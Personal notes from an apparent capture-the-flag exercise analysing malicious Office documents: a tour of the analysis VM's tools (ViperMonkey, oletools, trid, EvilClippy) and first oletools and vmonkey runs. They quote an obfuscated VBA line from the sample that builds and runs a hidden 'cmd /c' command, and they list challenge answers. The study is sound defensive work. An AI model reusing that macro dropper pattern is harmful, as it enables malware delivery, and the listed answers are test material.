# Squid Game Meta Notes



What is the Environment?
![](toolsonthevm.png)

[GitHub - AndroidProjectCreator](https://github.com/ThisIsLibra/AndroidProjectCreator): *"Convert an APK to an Android Studio Project using multiple open-source decompilers"*
- [maxkersten.nl/projects/androidprojectcreator/](https://maxkersten.nl/projects/androidprojectcreator/ "https://maxkersten.nl/projects/androidprojectcreator/")

Packet/Network Analysis tools:
- Brim, NetworkMiner

Baksmali is for Android assembly - 

binee-files cannot seem to dork and usage, no man page for it on the box

Burpsuite for http(s) related problems

containerd possible for dockerised tooling

[GitHub - EvilClippy](https://github.com/outflanknl/EvilClippy): *"A cross-platform assistant for creating malicious MS Office documents. Can hide VBA macros, stomp VBA code (via P-Code) and confuse macro analysis tools. Runs on Linux, OSX and Windows."*

Ghidra for reversing

Google for chrome

`ilspycmd` for dot net decompilation

[GitHub jd-gui](https://github.com/java-decompiler/jd-gui): *"A standalone Java Decompiler GUI"*

[GitHub malwoverview](https://github.com/alexandreborges/malwoverview): *"Malwoverview is a first response tool used for threat hunting and offers intel information from Virus Total, Hybrid Analysis, URLHaus, Polyswarm, Malshare, Alien Vault, Malpedia, Malware Bazaar, ThreatFox, Triage, InQuest and it is able to scan Android devices against VT."*

PowerShell version 7 - `/opt/microsoft/powershell/7/pwsh`

oledump - the document xml dumping tools I remember 

[Github - PortEx](https://github.com/struppigel/PortEx) *"Java library to analyse Portable Executable files with a special focus on malware analysis and PE malformation robustness"*

[procdot](https://www.procdot.com/):  *"ProcDOT is not necessarily a malware analysis tool per se. ProcDOT is a tool that visualizes system activities in a very convenient way."*

runsc - is a very generically named tool

scdbg - shell code debugger - find a good link
- SANS article: https://isc.sans.edu/diary/Analyzing+Encoded+Shellcode+with+scdbg/24134

[Github vipermonkey](https://github.com/decalage2/ViperMonkey): *"A VBA parser and emulation engine to analyze malicious macros."*
- SANS article: https://isc.sans.edu/diary/ViperMonkey+VBA+maldoc+deobfuscation/24346

Not in `/opt` we have
- python2.7 and 3
- wireshark
- wxHexEditor

TIL: https://www.byobu.org/ could replace my tmux.conf if I can convert it and if it is actually better

**Authors Oppinion**: 
- best tool name on the box: EvilClippy
- best looking tool malwoverview
- There is a lot of Java and Android here making me more uncomfortable
- Best tool idea, but with the worst website is procdot

Next poked at the documents with box, opening it, `cat`ting it, `strings`ing it. Then when the maldocs room:
IOCs
- Presence of Malicious URLs
- References to File Names / API functions  
- IP addresses
- Domains
- Malicious Script like Powershell, JavaScript, VBScript Macros, etc

Issues and questions:
- How is data encoded, encrypted?
- How is data hidden?
- Links and DNS
- Embedding Objects masquerading as benign click-ables or mouse-over-ables 

Answers from THM maldoc room
- Brain and IT fundamentals
- oletools
- ViperMonkey

Using brain:
- What malware objects will Maldocs have?
	- Replacable artefacts
	- No special sauce malware
	- Combinable techniques that prevent pattern recognition 
	- Human readable, human trickable
	- Glorified dropper to get to loader 

What I think I will start with day one:
1. ViperMonkey
2. `trid`
3. Oletools routine

![](SnakeBaboonOnUbuntu.png)

`trid` is a file identification tool - [GitHub](https://github.com/dubfr33/trid): *"TrID is a utility designed to identify file types from their binary signatures. While there are similar utilities with hard coded rules, TriID has no such rules. Instead, it is extensible and can be trained to recognize new formats in a fast and automatic way. TrID uses a database of definitions which describe recurring patterns
for supported file types."*

![](trid-v-a1.png)

```bash
# run first to prevent stdout and brain overflow 
vmonkey Desktop/maldocs/attacker1.doc
# -p output2FileAndStdout 
# -e Extract and evaluate/deobfuscate constant expressions
# -c idsplay IOCs in VBA
vmonkey -p attacker1.vmonkey -e -c Desktop/maldocs/attacker1.doc
```

oletools
```bash
# Get basic information 
oleid
```

![](oleid-a1.png)

```vb
ChrW() ' Returns the Unicode character that corresponds to the specified character code
CBool() ' convert to a boolean
Len() ' returns the number of characters in a text string.
LenB() ' returns the number of bytes used to represent the characters in a text string
Trim() ' Trims both leading and tailing string expressions
```

https://support.microsoft.com/en-gb/office/len-lenb-functions-29236f94-cedc-429d-affd-b5e33d2c67cb
https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ltrim-rtrim-and-trim-functions
https://learn.microsoft.com/en-us/office/vba/language/concepts/getting-started/type-conversion-functions
https://help.libreoffice.org/latest/ro/text/sbasic/shared/03120112.html

![](vba-questioninghowtomakethis-moreeffient.png)


```vba
VBA.Shell# "CmD /C " + Trim(rjvFRbqzLtkzn) + SKKdjMpgJRQRK + Trim(Replace(pNHbvwXpnbZvS.AlternativeText + "", "[", "A")) + hdNxDVBxCTqQTpB + RJzJQGRzrc + CWflqnrJbKVBj, CInt(351 * 2 + -702)

 Set pNHbvwXpnbZvS = Shapes(Trim("h9mkae7"))
```

My guess is that `VBA.Shell` method will take everything above plus the possible key `Set pNHbvwXpnbZvS = Shapes(Trim("h9mkae7"))` to decrypt or use the key as an api call

Needing to know VBA makes this like being stuck ice as I cannot just run it so I tried a trick heard about turning CTFs into other CTFs by making it a wireshark CTF. The outliner IP did not fit the answer to Include the malicious IP and the php extension found in the maldoc.

Find the phone number in the maldoc. (Answer format: xxx-xxx-xxxx)
```bash
olemeta attacker1.doc
# 213-446-1757
# West Virginia  Samanta
```

I remember vaguely there is a tool to dump the xml and `http://schemas.openxmlformats.org/officeDocument/2006/customXml` could be another vba inside a vba...

I went a few minutes over a hour and looked the hints for some of questions just to push out all the low hanging even a monkey could get these 

Time-related malware shinagans
```bash
oletimes
# 2019-02-07 23:45:30
```

```bash
olevba
# AutoExec
```

https://www.onlinegdb.com/online_vb_compiler